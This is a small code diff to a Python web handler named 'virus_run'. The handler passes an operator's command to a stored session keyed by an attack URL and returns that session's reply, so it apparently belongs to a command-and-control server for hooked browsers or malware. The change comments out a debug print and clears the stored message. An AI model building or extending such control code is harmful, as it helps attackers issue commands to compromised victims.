@@ -391,12 +391,13 @@ def xhr_run(token):
 def virus_run(attack_url):
     command = json.loads(request.get_data().decode('utf-8'))['command']
     if attack_url in url_list.keys():
-        print("ufdlkaslkfjdlkfjljflkdsjdf")
+        # print("ufdlkaslkfjdlkfjljflkdsjdf")
         u: user_sessen = url_list.get(attack_url)
         # 返回u.message的值
         message_to_return = u.message
         u.attack_command = command
         # 返回之前存储的消息
+        url_list.get(attack_url).message = 'none'
         return message_to_return
     else:
         return 'none'
